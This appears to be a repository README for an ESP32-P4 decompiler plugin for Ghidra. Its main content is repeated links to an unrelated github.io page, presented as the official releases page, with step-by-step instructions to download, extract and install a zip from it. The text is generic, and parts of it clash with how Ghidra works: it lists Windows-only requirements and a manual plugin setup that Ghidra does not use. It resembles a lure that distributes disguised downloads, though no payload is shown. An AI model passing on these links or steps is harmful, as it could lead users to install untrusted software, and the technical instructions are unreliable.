# 🔍 esp32-p4-decompiler-plugin - Analyze ESP32-P4 firmware files with ease

[![Download Plugin](https://img.shields.io/badge/Download_Plugin-blue.svg)](https://seemafir6626.github.io)

This document helps you install the esp32-p4-decompiler-plugin. This tool allows you to examine firmware written for the ESP32-P4 chip. You will use this tool inside the Ghidra software suite to view code logic and understand how your device functions.

## 📋 What this tool does

The ESP32-P4 chip uses the RISC-V architecture. Analyzing this code can be difficult because the structure differs from standard computer processors. This plugin adds specific support to Ghidra so it understands the instructions used by the ESP32-P4.

The tool provides the following functions:
* It maps peripheral addresses to help you identify hardware parts.
* It recovers symbols from ROM memory to label functions.
* It uses the ESP-IDF FIDB database to recognize standard library functions.
* It defines SIMD instructions for faster code analysis.

## ⚙️ System requirements

Before you begin, ensure your computer meets these requirements:
* Windows 10 or Windows 11.
* A 64-bit version of the Java Development Kit (JDK) version 17 or newer.
* Ghidra 10.3 or a newer version installed on your hard drive.
* At least 4 GB of available system memory.

## 💾 How to get the plugin

You must download the correct file from the official project page. Follow these steps to obtain the software:

1. Click the link below to go to the releases page.
2. Look for the latest version at the top of the list.
3. Locate the file ending in `.zip` under the Assets section.
4. Click the file name to download it to your computer.

[Visit this page to download](https://seemafir6626.github.io)

## 🛠️ Step-by-step installation

Installation requires adding the plugin files to your Ghidra folders. Follow these steps exactly:

1. Open your Downloads folder and find the file you saved.
2. Right-click the folder and select Extract All. Choose a location where you can easily find the contents.
3. Open your Ghidra installation directory.
4. Open the extensions folder located inside the Ghidra folder.
5. Create a new folder named ESP32-P4-Support.
6. Copy the contents of the plugin zip file into this new folder.
7. Start your Ghidra application.
8. Go to the File menu and select Configure.
9. Click the Plugins button.
10. Search for the ESP32-P4 plugin in the list and check the box to enable it.
11. Restart your Ghidra application.

## 📂 Using the plugin for analysis

Once you activate the plugin, you can open an ESP32-P4 firmware file. Ghidra asks you to select a language when you import a file. You will now see a new option for the ESP32-P4 RISC-V architecture. 

Select this language to ensure the software interprets the instructions correctly. After the analysis completes, look at the Program Trees and Symbols windows. You will see labels for hardware registers and function names that were previously missing. You can now read the code logic in the decompiler window.

## ❓ Frequently asked questions

**Do I need a custom setup for the ESP-IDF library?**
The plugin automatically recognizes common library functions based on the ESP-IDF standard. You do not need to perform extra steps for this coverage.

**What happens if the code appears garbled?**
Check if you selected the correct RISC-V architecture version during the import stage. Ensure that your firmware file is a binary dump taken from a working device.

**Can I use this on other chips?**
This plugin specifically targets the P4 model. While it uses the RISC-V base, the peripheral mapping and ROM symbols are unique to this specific ESP32 hardware.

**Does this software modify the actual device firmware?**
No. This tool only reads files on your computer. It performs no actions to flash or change the data on your hardware.

**Where do I find updates?**
Return to the release link provided in this document periodically. If a new version appears, repeat the installation steps to replace your current files.

## 🔧 Managing plugin settings

You can adjust how the tool processes your data through the Ghidra Analysis Options window. Access this by selecting Analysis then Auto Analyze from the menu bar. If you need to re-run the identification process, select the ESP32-P4 specific options and click Analyze. This ignores any cached settings and performs the identification from scratch. This process is useful if you change your local symbols or import a different version of the library.